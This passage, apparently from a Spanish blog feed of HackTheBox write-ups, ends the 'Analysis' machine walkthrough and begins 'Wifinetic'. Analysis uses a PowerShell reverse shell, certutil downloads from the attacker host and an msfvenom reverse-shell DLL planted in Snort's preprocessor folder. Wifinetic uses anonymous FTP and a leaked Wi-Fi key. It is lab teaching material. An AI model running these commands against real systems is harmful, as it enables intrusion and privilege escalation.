Saving to: ‘Invoke-PowerShellTcp.ps1’

Invoke-PowerShellTcp.ps1             100%[<span class="o">=====================================================================&gt;]</span>   4.24K  <span class="nt">--</span>.-KB/s    <span class="k">in </span>0s

2024-06-07 14:30:36 <span class="o">(</span>40.0 MB/s<span class="o">)</span> - ‘Invoke-PowerShellTcp.ps1’ saved <span class="o">[</span>4339/4339]

➜  content <span class="nb">mv </span>Invoke-PowerShellTcp.ps1 ps.ps1
➜  content <span class="nb">echo</span> <span class="s1">'Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.63 -Port 443'</span> <span class="o">&gt;&gt;</span> ps.ps1
</code></pre></div></div>

<ul>
  <li>Nos ponemos en escucha.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content rlwrap <span class="nt">-cAr</span> nc <span class="nt">-nlvp</span> 443
listening on <span class="o">[</span>any] 443 ...
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content python3 <span class="nt">-m</span> http.server 80
Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
</code></pre></div></div>

<ul>
  <li>Ahora usamos la <code class="language-plaintext highlighter-rouge">webshell</code>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/analysis/21.png" />
</p>

<ul>
  <li>Nos llega la shell.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content rlwrap <span class="nt">-cAr</span> nc <span class="nt">-nlvp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>10.10.14.63] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.250] 54783
Windows PowerShell running as user DC-ANALYSIS<span class="nv">$ </span>on DC-ANALYSIS
Copyright <span class="o">(</span>C<span class="o">)</span> 2015 Microsoft Corporation. All rights reserved.

PS C:<span class="se">\i</span>netpub<span class="se">\i</span>nternal<span class="se">\d</span>ashboard<span class="se">\u</span>ploads&gt;whoami
analysis<span class="se">\s</span>vc_web
PS C:<span class="se">\i</span>netpub<span class="se">\i</span>nternal<span class="se">\d</span>ashboard<span class="se">\u</span>ploads&gt;
</code></pre></div></div>

<h2 id="shell-as-jdoe">Shell as jdoe</h2>

<ul>
  <li>Vamos a enumerar el sistema.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\t</span>est&gt; certutil.exe <span class="nt">-f</span> <span class="nt">-urlcache</span> <span class="nt">-split</span> http://10.10.14.63:8080/winPEASx64.exe
<span class="k">****</span>  En ligne  <span class="k">****</span>
  000000  ...
  246e00
CertUtil: <span class="nt">-URLCache</span> La commande s?est termin?e correctement.
</code></pre></div></div>

<ul>
  <li>Después de correr el winPEASx64 nos da las credenciales del usuario <code class="language-plaintext highlighter-rouge">jdoe:7y4Z4^*y9Zzj</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  Downloads cme smb analysis.htb <span class="nt">-u</span> jdoe <span class="nt">-p</span> <span class="s1">'7y4Z4^*y9Zzj'</span>
SMB         internal.analysis.htb 445    DC-ANALYSIS      <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 / Server 2019 Build 17763 x64 <span class="o">(</span>name:DC-ANALYSIS<span class="o">)</span> <span class="o">(</span>domain:analysis.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         internal.analysis.htb 445    DC-ANALYSIS      <span class="o">[</span>+] analysis.htb<span class="se">\j</span>doe:7y4Z4^<span class="k">*</span>y9Zzj
</code></pre></div></div>

<ul>
  <li>Vemos que también podemos conectarnos con <code class="language-plaintext highlighter-rouge">evil-winrm</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  Downloads cme winrm analysis.htb <span class="nt">-u</span> jdoe <span class="nt">-p</span> <span class="s1">'7y4Z4^*y9Zzj'</span>
SMB         internal.analysis.htb 5985   DC-ANALYSIS      <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 / Server 2019 Build 17763 <span class="o">(</span>name:DC-ANALYSIS<span class="o">)</span> <span class="o">(</span>domain:analysis.htb<span class="o">)</span>
HTTP        internal.analysis.htb 5985   DC-ANALYSIS      <span class="o">[</span><span class="k">*</span><span class="o">]</span> http://internal.analysis.htb:5985/wsman
WINRM       internal.analysis.htb 5985   DC-ANALYSIS      <span class="o">[</span>+] analysis.htb<span class="se">\j</span>doe:7y4Z4^<span class="k">*</span>y9Zzj <span class="o">(</span>Pwn3d!<span class="o">)</span>
</code></pre></div></div>

<h2 id="user-flag">User flag</h2>

<ul>
  <li>Ya podemos leer la <code class="language-plaintext highlighter-rouge">flag</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  Downloads evil-winrm <span class="nt">-i</span> 10.10.11.250 <span class="nt">-u</span> <span class="s1">'jdoe'</span> <span class="nt">-p</span> <span class="s1">'7y4Z4^*y9Zzj'</span>

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function </span>is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\j</span>doe<span class="se">\D</span>ocuments&gt; <span class="nb">type</span> ..<span class="se">\D</span>esktop<span class="se">\u</span>ser.txt
cdb21e01560374f401e7d5b960a73d53
</code></pre></div></div>

<h2 id="escalada-de-privilegios">Escalada de Privilegios</h2>

<ul>
  <li>Vemos que esta <code class="language-plaintext highlighter-rouge">snort</code> por allí <a href="https://protecciondatos-lopd.com/empresas/snort-deteccion-intrusos/">https://protecciondatos-lopd.com/empresas/snort-deteccion-intrusos/</a>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\&gt;</span> <span class="nb">dir


    </span>Directory: C:<span class="se">\</span>


Mode                LastWriteTime         Length Name
<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
d-----        6/12/2023  10:01 AM                inetpub
d-----        11/5/2022   8:14 PM                PerfLogs
d-----         5/8/2023  10:20 AM                PHP
d-----         7/9/2023  10:54 AM                private
d-r---       11/18/2023   9:56 AM                Program Files
d-----         5/8/2023  10:11 AM                Program Files <span class="o">(</span>x86<span class="o">)</span>
d-----         7/9/2023  10:57 AM                Snort
d-r---        5/26/2023   2:20 PM                Users
d-----        1/10/2024   3:52 PM                Windows
<span class="nt">-a----</span>         6/7/2024  11:17 PM         310050 snortlog.txt
</code></pre></div></div>

<ul>
  <li>
    <p>Encontramos en el manual información interesante <a href="http://manual-snort-org.s3-website-us-east-1.amazonaws.com/node23.html">http://manual-snort-org.s3-website-us-east-1.amazonaws.com/node23.html</a>.</p>
  </li>
  <li>
    <p>Podemos cargar una <code class="language-plaintext highlighter-rouge">dll</code> maliciosa.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/analysis/22.png" />
</p>

<ul>
  <li>Aquí están las <code class="language-plaintext highlighter-rouge">ddl</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\S</span>nort<span class="se">\e</span>tc&gt; <span class="nb">type </span>snort.conf | findstr dynamicpreprocessor
dynamicpreprocessor directory C:<span class="se">\S</span>nort<span class="se">\l</span>ib<span class="se">\s</span>nort_dynamicpreprocessor
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\S</span>nort<span class="se">\e</span>tc&gt; <span class="nb">dir </span>C:<span class="se">\S</span>nort<span class="se">\l</span>ib<span class="se">\s</span>nort_dynamicpreprocessor


    Directory: C:<span class="se">\S</span>nort<span class="se">\l</span>ib<span class="se">\s</span>nort_dynamicpreprocessor


Mode                LastWriteTime         Length Name
<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
<span class="nt">-a----</span>        5/24/2022   6:46 AM         207872 sf_dce2.dll
<span class="nt">-a----</span>        5/24/2022   6:46 AM          33792 sf_dnp3.dll
<span class="nt">-a----</span>        5/24/2022   6:46 AM          22528 sf_dns.dll
<span class="nt">-a----</span>        5/24/2022   6:46 AM         108032 sf_ftptelnet.dll
<span class="nt">-a----</span>        5/24/2022   6:46 AM          47616 sf_gtp.dll
<span class="nt">-a----</span>        5/24/2022   6:47 AM          59392 sf_imap.dll
<span class="nt">-a----</span>        5/24/2022   6:47 AM          23552 sf_modbus.dll
<span class="nt">-a----</span>        5/24/2022   6:47 AM          58368 sf_pop.dll
<span class="nt">-a----</span>        5/24/2022   6:47 AM          52736 sf_reputation.dll
<span class="nt">-a----</span>        5/24/2022   6:47 AM          37888 sf_sdf.dll
<span class="nt">-a----</span>        5/24/2022   6:47 AM          52224 sf_sip.dll
<span class="nt">-a----</span>        5/24/2022   6:47 AM          78848 sf_smtp.dll
<span class="nt">-a----</span>        5/24/2022   6:47 AM          22016 sf_ssh.dll
<span class="nt">-a----</span>        5/24/2022   6:47 AM          32256 sf_ssl.dll
</code></pre></div></div>

<ul>
  <li>Podemos subir la <code class="language-plaintext highlighter-rouge">dll</code> maliciosa.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\S</span>nort<span class="se">\l</span>ib&gt; icacls snort_dynamicpreprocessor
snort_dynamicpreprocessor AUTORITE NT<span class="se">\S</span>ystŠme:<span class="o">(</span>I<span class="o">)(</span>OI<span class="o">)(</span>CI<span class="o">)(</span>F<span class="o">)</span>
                          BUILTIN<span class="se">\A</span>dministrateurs:<span class="o">(</span>I<span class="o">)(</span>OI<span class="o">)(</span>CI<span class="o">)(</span>F<span class="o">)</span>
                          BUILTIN<span class="se">\U</span>tilisateurs:<span class="o">(</span>I<span class="o">)(</span>OI<span class="o">)(</span>CI<span class="o">)(</span>RX<span class="o">)</span>
                          BUILTIN<span class="se">\U</span>tilisateurs:<span class="o">(</span>I<span class="o">)(</span>CI<span class="o">)(</span>AD<span class="o">)</span>
                          BUILTIN<span class="se">\U</span>tilisateurs:<span class="o">(</span>I<span class="o">)(</span>CI<span class="o">)(</span>WD<span class="o">)</span>
                          CREATEUR PROPRIETAIRE:<span class="o">(</span>I<span class="o">)(</span>OI<span class="o">)(</span>CI<span class="o">)(</span>IO<span class="o">)(</span>F<span class="o">)</span>

Successfully processed 1 files<span class="p">;</span> Failed processing 0 files
</code></pre></div></div>

<ul>
  <li>Podemos crear la <code class="language-plaintext highlighter-rouge">dll</code> con <code class="language-plaintext highlighter-rouge">msfvenom</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content msfvenom <span class="nt">-p</span> windows/x64/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.14.63 <span class="nv">LPORT</span><span class="o">=</span>443 <span class="nt">-f</span> dll <span class="nt">-a</span> x64 <span class="nt">-o</span> mg.dll
<span class="o">[</span>-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of dll file: 9216 bytes
Saved as: mg.dll
</code></pre></div></div>

<ul>
  <li>Ahora lo pasamos ala maquina.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content python3 <span class="nt">-m</span> http.server 80
Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
10.10.11.250 - - <span class="o">[</span>07/Jun/2024 15:33:59] <span class="s2">"GET /mg.dll HTTP/1.1"</span> 200 -
10.10.11.250 - - <span class="o">[</span>07/Jun/2024 15:33:59] <span class="s2">"GET /mg.dll HTTP/1.1"</span> 200 -
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\S</span>nort<span class="se">\l</span>ib<span class="se">\s</span>nort_dynamicpreprocessor&gt; certutil.exe <span class="nt">-f</span> <span class="nt">-urlcache</span> <span class="nt">-split</span> http://10.10.14.63/mg.dll
<span class="k">****</span>  Online  <span class="k">****</span>
  0000  ...
  2400
CertUtil: <span class="nt">-URLCache</span> <span class="nb">command </span>completed successfully.
</code></pre></div></div>

<h2 id="shell-as-root">Shell as root</h2>

<ul>
  <li><code class="language-plaintext highlighter-rouge">Snort</code> carga la <code class="language-plaintext highlighter-rouge">dll</code> automáticamente cada cierto tiempo así que cuando la carga nos llega la <code class="language-plaintext highlighter-rouge">shell</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content rlwrap <span class="nt">-cAr</span> nc <span class="nt">-nlvp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>10.10.14.63] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.250] 55072
Microsoft Windows <span class="o">[</span>Version 10.0.17763.5329]
<span class="o">(</span>c<span class="o">)</span> 2018 Microsoft Corporation. All rights reserved.

C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;whoami
<span class="nb">whoami
</span>analysis<span class="se">\a</span>dministrateur
</code></pre></div></div>

<h2 id="root-flag">Root flag</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\U</span>sers<span class="se">\A</span>dministrateur<span class="se">\D</span>esktop&gt;type root.txt
<span class="nb">type </span>root.txt
68d63d846dcaa03ffaaa05975e3a40f1
</code></pre></div></div>]]></content><author><name>MiguelRega7</name></author><category term="hackthebox/machines/hard" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HackTheBox - Wifinetic (easy)</title><link href="http://localhost:4000/hackthebox/machines/medium/2024/06/05/wifinetic.html" rel="alternate" type="text/html" title="HackTheBox - Wifinetic (easy)" /><published>2024-06-05T00:00:00-06:00</published><updated>2024-06-05T00:00:00-06:00</updated><id>http://localhost:4000/hackthebox/machines/medium/2024/06/05/wifinetic</id><content type="html" xml:base="http://localhost:4000/hackthebox/machines/medium/2024/06/05/wifinetic.html"><![CDATA[<p align="center">
<img src="https://labs.hackthebox.com/storage/avatars/4aaf2ad33bea830079d74497f8e7fefc.png" />
</p>

<ul>
  <li>Wifinetic is an easy difficulty Linux machine which presents an intriguing network challenge, focusing on wireless security and network monitoring. An exposed FTP service has anonymous authentication enabled which allows us to download available files. One of the file being an OpenWRT backup which contains Wireless Network configuration that discloses an Access Point password. The contents of shadow or passwd files further disclose usernames on the server. With this information, a password reuse attack can be carried out on the SSH service, allowing us to gain a foothold as the netadmin user. Using standard tools and with the provided wireless interface in monitoring mode, we can brute force the WPS PIN for the Access Point to obtain the pre-shared key ( PSK ). The pass phrase can be reused on SSH service to obtain root access on the server.</li>
</ul>

<h2 id="portscan">PortScan</h2>

<ul>
  <li>Comenzamos haciendo un escaneo de puertos abiertos y sus servicios por el protocolo <strong>TCP</strong>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p21</span>,22,53 10.10.11.247 <span class="nt">-oN</span> targeted
Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-06-05 12:21 CST
Nmap scan report <span class="k">for </span>10.10.11.247
Host is up <span class="o">(</span>0.084s latency<span class="o">)</span><span class="nb">.</span>

PORT   STATE SERVICE    VERSION
21/tcp open  ftp        vsftpd 3.0.3
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.10.14.2
|      Logged <span class="k">in </span>as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session <span class="nb">timeout </span><span class="k">in </span>seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed <span class="o">(</span>FTP code 230<span class="o">)</span>
| <span class="nt">-rw-r--r--</span>    1 ftp      ftp          4434 Jul 31  2023 MigrateOpenWrt.txt
| <span class="nt">-rw-r--r--</span>    1 ftp      ftp       2501210 Jul 31  2023 ProjectGreatMigration.pdf
| <span class="nt">-rw-r--r--</span>    1 ftp      ftp         60857 Jul 31  2023 ProjectOpenWRT.pdf
| <span class="nt">-rw-r--r--</span>    1 ftp      ftp         40960 Sep 11  2023 backup-OpenWrt-2023-07-26.tar
|_-rw-r--r--    1 ftp      ftp         52946 Jul 31  2023 employees_wellness.pdf
22/tcp open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey:
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae <span class="o">(</span>RSA<span class="o">)</span>
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb <span class="o">(</span>ED25519<span class="o">)</span>
53/tcp open  tcpwrapped
Service Info: OSs: Unix, Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
</code></pre></div></div>

<h2 id="enumeración">Enumeración</h2>

<ul>
  <li>Si analizamos el escaneo vemos que tenemos puerto el puerto <strong>21</strong> que corresponde al servicio <strong>FTP</strong> el cual podemos conectarnos usando un <code class="language-plaintext highlighter-rouge">Anonymous FTP login</code> ya que esta habilitado además de que nos comparten archivos <code class="language-plaintext highlighter-rouge">pdf, tar y txt</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap ftp 10.10.11.247
Connected to 10.10.11.247.
220 <span class="o">(</span>vsFTPd 3.0.3<span class="o">)</span>
Name <span class="o">(</span>10.10.11.247:miguel<span class="o">)</span>: anonymous
230 Login successful.
Remote system <span class="nb">type </span>is UNIX.
Using binary mode to transfer files.
ftp&gt; <span class="nb">dir
</span>229 Entering Extended Passive Mode <span class="o">(||</span>|40843|<span class="o">)</span>
150 Here comes the directory listing.
<span class="nt">-rw-r--r--</span>    1 ftp      ftp          4434 Jul 31  2023 MigrateOpenWrt.txt
<span class="nt">-rw-r--r--</span>    1 ftp      ftp       2501210 Jul 31  2023 ProjectGreatMigration.pdf
<span class="nt">-rw-r--r--</span>    1 ftp      ftp         60857 Jul 31  2023 ProjectOpenWRT.pdf
<span class="nt">-rw-r--r--</span>    1 ftp      ftp         40960 Sep 11  2023 backup-OpenWrt-2023-07-26.tar
<span class="nt">-rw-r--r--</span>    1 ftp      ftp         52946 Jul 31  2023 employees_wellness.pdf
226 Directory send OK.
</code></pre></div></div>

<ul>
  <li>Vamos a descargarnos todo.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ftp&gt; prompt off
Interactive mode off.
ftp&gt; mget <span class="k">*</span>
<span class="nb">local</span>: MigrateOpenWrt.txt remote: MigrateOpenWrt.txt
229 Entering Extended Passive Mode <span class="o">(||</span>|47292|<span class="o">)</span>
150 Opening BINARY mode data connection <span class="k">for </span>MigrateOpenWrt.txt <span class="o">(</span>4434 bytes<span class="o">)</span><span class="nb">.</span>
100% |<span class="k">******************************************************************************************************</span>|  4434       25.02 MiB/s    00:00 ETA
226 Transfer complete.
4434 bytes received <span class="k">in </span>00:00 <span class="o">(</span>48.57 KiB/s<span class="o">)</span>
<span class="nb">local</span>: ProjectGreatMigration.pdf remote: ProjectGreatMigration.pdf
229 Entering Extended Passive Mode <span class="o">(||</span>|47722|<span class="o">)</span>
150 Opening BINARY mode data connection <span class="k">for </span>ProjectGreatMigration.pdf <span class="o">(</span>2501210 bytes<span class="o">)</span><span class="nb">.</span>
100% |<span class="k">******************************************************************************************************</span>|  2442 KiB  649.31 KiB/s    00:00 ETA
226 Transfer complete.
2501210 bytes received <span class="k">in </span>00:03 <span class="o">(</span>634.83 KiB/s<span class="o">)</span>
<span class="nb">local</span>: ProjectOpenWRT.pdf remote: ProjectOpenWRT.pdf
229 Entering Extended Passive Mode <span class="o">(||</span>|49450|<span class="o">)</span>
150 Opening BINARY mode data connection <span class="k">for </span>ProjectOpenWRT.pdf <span class="o">(</span>60857 bytes<span class="o">)</span><span class="nb">.</span>
100% |<span class="k">******************************************************************************************************</span>| 60857      322.21 KiB/s    00:00 ETA
226 Transfer complete.
60857 bytes received <span class="k">in </span>00:00 <span class="o">(</span>214.25 KiB/s<span class="o">)</span>
<span class="nb">local</span>: backup-OpenWrt-2023-07-26.tar remote: backup-OpenWrt-2023-07-26.tar
229 Entering Extended Passive Mode <span class="o">(||</span>|47415|<span class="o">)</span>
150 Opening BINARY mode data connection <span class="k">for </span>backup-OpenWrt-2023-07-26.tar <span class="o">(</span>40960 bytes<span class="o">)</span><span class="nb">.</span>
100% |<span class="k">******************************************************************************************************</span>| 40960      368.09 KiB/s    00:00 ETA
226 Transfer complete.
40960 bytes received <span class="k">in </span>00:00 <span class="o">(</span>205.82 KiB/s<span class="o">)</span>
<span class="nb">local</span>: employees_wellness.pdf remote: employees_wellness.pdf
229 Entering Extended Passive Mode <span class="o">(||</span>|49749|<span class="o">)</span>
150 Opening BINARY mode data connection <span class="k">for </span>employees_wellness.pdf <span class="o">(</span>52946 bytes<span class="o">)</span><span class="nb">.</span>
100% |<span class="k">******************************************************************************************************</span>| 52946      300.96 KiB/s    00:00 ETA
226 Transfer complete.
52946 bytes received <span class="k">in </span>00:00 <span class="o">(</span>200.50 KiB/s<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>En el <strong>.txt</strong> nos hablan sobre <code class="language-plaintext highlighter-rouge">OpenWRT</code> <a href="https://www.redeszone.net/tutoriales/redes-cable/openwrt-utilidades-router/">https://www.redeszone.net/tutoriales/redes-cable/openwrt-utilidades-router/</a>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">cat </span>MigrateOpenWrt.txt
  +-------------------------------------------------------+
  |             Replace OpenWRT with Debian                |
  +-------------------------------------------------------+
  |                                                       |
  |  +-----------------------------------------------+    |
  |  |        Evaluate Current OpenWRT Setup        |    |
  |  +-----------------------------------------------+    |
  |                                                       |
  |  +-----------------------------------------------+    |
  |  |         Plan and Prepare the Migration       |    |
  |  +-----------------------------------------------+    |
  |  |                                               |    |
  |  |   - Inventory current hardware and software   |    |
  |  |   - Identify dependencies and customizations  |    |
  |  |   - Research Debian-compatible alternatives   |    |
  |  |   - Backup critical configurations and data   |    |
  |  |                                               |    |
  |  +-----------------------------------------------+    |
  |                                                       |
  |  +-----------------------------------------------+    |
  |  |            Install Debian on Devices         |    |
  |  +-----------------------------------------------+    |
  |  |                                               |    |
  |  |   - Obtain latest Debian release              |    |
  |  |   - Check hardware compatibility              |    |
  |  |   - Flash/install Debian on each device       |    |
  |  |   - Verify successful installations           |    |
  |  |                                               |    |
  |  +-----------------------------------------------+    |
  |                                                       |
  |  +-----------------------------------------------+    |
  |  |         Set Up Networking and Services       |    |
  |  +-----------------------------------------------+    |
  |  |                                               |    |
  |  |   - Configure network interfaces              |    |
  |  |   - Install and configure Wifi drivers        |    |
  |  |   - Set up DHCP, DNS, and routing             |    |
  |  |   - Install firewall and security measures    |    |
  |  |   - Set up any additional services needed     |    |
  |  |                                               |    |
  |  +-----------------------------------------------+    |
  |                                                       |
  |  +-----------------------------------------------+    |
  |  |           Migrate Configurations             |    |
  |  +-----------------------------------------------+    |
  |  |                                               |    |
  |  |   - Adapt OpenWRT configurations to Debian    |    |
  |  |   - Migrate custom settings and scripts       |    |
  |  |   - Ensure compatibility with new system      |    |
  |  |                                               |    |
  |  +-----------------------------------------------+    |
  |                                                       |
  |  +-----------------------------------------------+    |
  |  |          Test and Troubleshoot               |    |
  |  +-----------------------------------------------+    |
  |  |                                               |    |
  |  |   - Test Wifi connectivity and performance    |    |
  |  |   - Verify all services are functioning       |    |
  |  |   - Address and resolve any issues            |    |
  |  |   - Test <span class="k">for </span>security issues with Reaver tool |    |
  |  |                                               |    |
  |  +-----------------------------------------------+    |
  |                                                       |
  |  +-----------------------------------------------+    |
  |  |         Monitor and Maintain                 |    |
  |  +-----------------------------------------------+    |
  |  |                                               |    |
  |  |   - Implement regular updates and patches     |    |
  |  |   - Monitor system health and performance     |    |
  |  |   - Maintain and optimize the Debian system   |    |
  |  |                                               |    |
  |  +-----------------------------------------------+    |
  |                                                       |
  +-------------------------------------------------------+
</code></pre></div></div>

<ul>
  <li>Si analizamos los <code class="language-plaintext highlighter-rouge">PDFs</code> encontramos información.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/wifinetic/1.png" />
</p>

<ul>
  <li>Aquí hablan solo de un proyecto que tienen.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/wifinetic/2.png" />
</p>

<ul>
  <li>Aquí nos hablan sobre la migración de <code class="language-plaintext highlighter-rouge">OpenWRT</code> para su red wifi y el <code class="language-plaintext highlighter-rouge">pdf</code> es del administrador de la red Oliver Walker.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/wifinetic/3.png" />
</p>

<ul>
  <li>Pues bueno no encontramos nada interesante vamos analizar el <code class="language-plaintext highlighter-rouge">backup-OpenWrt-2023-07-26.tar</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap 7z x backup-OpenWrt-2023-07-26.tar

7-Zip 23.01 <span class="o">(</span>x64<span class="o">)</span> : Copyright <span class="o">(</span>c<span class="o">)</span> 1999-2023 Igor Pavlov : 2023-06-20
 64-bit <span class="nv">locale</span><span class="o">=</span>C.UTF-8 Threads:128 OPEN_MAX:1024

Scanning the drive <span class="k">for </span>archives:
1 file, 40960 bytes <span class="o">(</span>40 KiB<span class="o">)</span>

Extracting archive: backup-OpenWrt-2023-07-26.tar
<span class="nt">--</span>
Path <span class="o">=</span> backup-OpenWrt-2023-07-26.tar
Type <span class="o">=</span> <span class="nb">tar
</span>Physical Size <span class="o">=</span> 40960
Headers Size <span class="o">=</span> 19968
Code Page <span class="o">=</span> UTF-8
Characteristics <span class="o">=</span> GNU ASCII

Everything is Ok

Folders: 7
Files: 27
Size:       13804
Compressed: 40960
</code></pre></div></div>

<ul>
  <li>Dentro del directorio <code class="language-plaintext highlighter-rouge">/etc</code> nos comparten muchos archivos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  etc tree
<span class="nb">.</span>
├── config
│   ├── dhcp
│   ├── dropbear
│   ├── firewall
│   ├── luci
│   ├── network
│   ├── rpcd
│   ├── system
│   ├── ucitrack
│   ├── uhttpd
│   └── wireless
├── dropbear
│   ├── dropbear_ed25519_host_key
│   └── dropbear_rsa_host_key
├── group
├── hosts
├── inittab
├── luci-uploads
├── nftables.d
│   ├── 10-custom-filter-chains.nft
│   └── README
├── opkg
│   └── keys
│       └── 4d017e6f1ed5d616
├── passwd
├── profile
├── rc.local
├── shells
├── shinit
├── sysctl.conf
├── uhttpd.crt
└── uhttpd.key

7 directories, 26 files
</code></pre></div></div>

<ul>
  <li>En <code class="language-plaintext highlighter-rouge">wireless</code> encontramos una <code class="language-plaintext highlighter-rouge">key</code> para al parecer un <code class="language-plaintext highlighter-rouge">AP</code> con nombre <code class="language-plaintext highlighter-rouge">wifinet1, wifinet0</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  config <span class="nb">cat </span>wireless

config wifi-device <span class="s1">'radio0'</span>
	option <span class="nb">type</span> <span class="s1">'mac80211'</span>
	option path <span class="s1">'virtual/mac80211_hwsim/hwsim0'</span>
	option cell_density <span class="s1">'0'</span>
	option channel <span class="s1">'auto'</span>
	option band <span class="s1">'2g'</span>
	option txpower <span class="s1">'20'</span>

config wifi-device <span class="s1">'radio1'</span>
	option <span class="nb">type</span> <span class="s1">'mac80211'</span>
	option path <span class="s1">'virtual/mac80211_hwsim/hwsim1'</span>
	option channel <span class="s1">'36'</span>
	option band <span class="s1">'5g'</span>
	option htmode <span class="s1">'HE80'</span>
	option cell_density <span class="s1">'0'</span>

config wifi-iface <span class="s1">'wifinet0'</span>
	option device <span class="s1">'radio0'</span>
	option mode <span class="s1">'ap'</span>
	option ssid <span class="s1">'OpenWrt'</span>
	option encryption <span class="s1">'psk'</span>
	option key <span class="s1">'VeRyUniUqWiFIPasswrd1!'</span>
	option wps_pushbutton <span class="s1">'1'</span>

config wifi-iface <span class="s1">'wifinet1'</span>
	option device <span class="s1">'radio1'</span>
	option mode <span class="s1">'sta'</span>
	option network <span class="s1">'wwan'</span>
	option ssid <span class="s1">'OpenWrt'</span>
	option encryption <span class="s1">'psk'</span>
	option key <span class="s1">'VeRyUniUqWiFIPasswrd1!'</span>
</code></pre></div></div>

<ul>
  <li>Aquí encontramos usuarios.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  etc <span class="nb">cat </span>group
